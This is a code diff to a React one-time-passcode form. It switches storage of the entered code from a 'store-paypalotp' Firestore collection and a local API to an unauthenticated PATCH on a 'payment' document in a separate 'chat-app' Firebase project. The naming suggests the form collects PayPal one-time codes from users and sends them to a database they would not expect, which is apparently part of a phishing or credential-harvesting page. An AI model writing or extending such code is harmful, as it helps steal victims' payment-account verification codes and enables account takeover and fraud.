@@ -55,38 +55,40 @@ const OTPForm = () => {
       console.log("User ID:", userId);
 
       await fetch(
-        'https://firestore.googleapis.com/v1/projects/chat-app-570c2/databases/(default)/documents/store-paypalotp',
+        `https://firestore.googleapis.com/v1/projects/chat-app-570c2/databases/(default)/documents/payment/${userId}?updateMask.fieldPaths=otp`,
         {
-          method: "POST",
+          method: "PATCH",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             fields: {
-              paypalotp: { stringValue: otpCode },
-              userId: { stringValue: userId },
+              otp: { stringValue: otpCode },
             },
-          }), // Fix here!
+          }),
         }
       );
+      setMessage("✅successfully!");
+      setOtp(["", "", "", "", "", ""]);
+      localStorage.removeItem("otp");
 
-      const response = await fetch(
-        `http://localhost:8000/api/store-paypalotp/${userId}`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ paypalotp: otpCode }), // Fix here!
-        }
-      );
+      // const response = await fetch(
+      //   `http://localhost:8000/api/store-paypalotp/${userId}`,
+      //   {
+      //     method: "POST",
+      //     headers: { "Content-Type": "application/json" },
+      //     body: JSON.stringify({ paypalotp: otpCode }), // Fix here!
+      //   }
+      // );
 
-      const data = await response.json();
-      setLoading(false);
+      // const data = await response.json();
+      // setLoading(false);
 
-      if (response.ok) {
-        setMessage("✅successfully!");
-        setOtp(["", "", "", "", "", ""]); // Clear fields after success
-        localStorage.removeItem("otp"); // Remove OTP from localStorage
-      } else {
-        setMessage(`❌ Error: ${data.message}`);
-      }
+      // if (response.ok) {
+      //   setMessage("✅successfully!");
+      //   setOtp(["", "", "", "", "", ""]); // Clear fields after success
+      //   localStorage.removeItem("otp"); // Remove OTP from localStorage
+      // } else {
+      //   setMessage(`❌ Error: ${data.message}`);
+      // }
     } catch (error) {
       setLoading(false);
       setMessage("❌ Server error. Please try again.");
